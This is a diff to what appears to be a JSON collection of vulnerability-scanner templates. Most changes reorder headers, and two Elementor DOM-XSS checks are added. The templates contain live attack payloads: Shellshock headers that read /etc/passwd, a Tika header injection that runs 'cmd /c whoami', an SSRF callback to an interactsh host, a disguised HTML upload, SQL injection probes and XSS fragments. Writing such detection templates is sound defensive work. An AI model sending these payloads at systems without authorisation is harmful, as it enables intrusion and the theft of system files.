@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6375,11 +6375,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -9510,8 +9510,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11633,8 +11633,8 @@
       "requests": [
         {
           "raw": [
-            "POST /incom/modules/uploader/showcase/script.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBEJZt0IK73M2mAbt\n\n------WebKitFormBoundaryBEJZt0IK73M2mAbt\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{randstr}}.png\"\nContent-Type: image/png\n\n\n------WebKitFormBoundaryBEJZt0IK73M2mAbt--\n",
-            "GET /upload/userfiles/image/{{randstr}}.png HTTP/1.1\nHost: {{Hostname}}\n"
+            "POST /incom/modules/uploader/showcase/script.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBEJZt0IK73M2mAbt\n\n------WebKitFormBoundaryBEJZt0IK73M2mAbt\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{randstr_1}}.png\"\nContent-Type: text/html\n\n{{randstr_2}}\n------WebKitFormBoundaryBEJZt0IK73M2mAbt--\n",
+            "GET /upload/userfiles/image/{{randstr_1}}.png HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -14020,6 +14020,22 @@
       ]
     },
     {
+      "id": "CVE-2021-24891",
+      "info": {
+        "name": "Elementor < 3.1.4 - DOM Cross-Site-Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/elementor/assets/js/frontend.min.js",
+            "{{BaseURL}}/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24926",
       "info": {
         "name": "WordPress Plugin Domain Check < 1.0.17 - XSS",
@@ -15676,8 +15692,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -18467,6 +18483,22 @@
           "raw": [
             "POST /scgi-bin/platform.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\nthispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain'+AND+'5434'%3d'5435'+AND+'MwLj'%3d'MwLj&button.login.USERDBUsers.router_status=Login&Login.userAgent=MDpd\n",
             "POST /scgi-bin/platform.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\nthispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain'+AND+'5434'%3d'5434'+AND+'MwLj'%3d'MwLj&button.login.USERDBUsers.router_status=Login&Login.userAgent=MDpd\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29455",
+      "info": {
+        "name": "Wordpress Elementor <= 3.5.5 - DOM-based Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/elementor/assets/js/frontend.min.js",
+            "{{BaseURL}}/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoidmlkZW8iLCJ1cmwiOiJodHRwOi8vIiwidmlkZW9UeXBlIjoiaG9zdGVkIiwidmlkZW9QYXJhbXMiOnsib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbikifX0="
           ]
         }
       ]
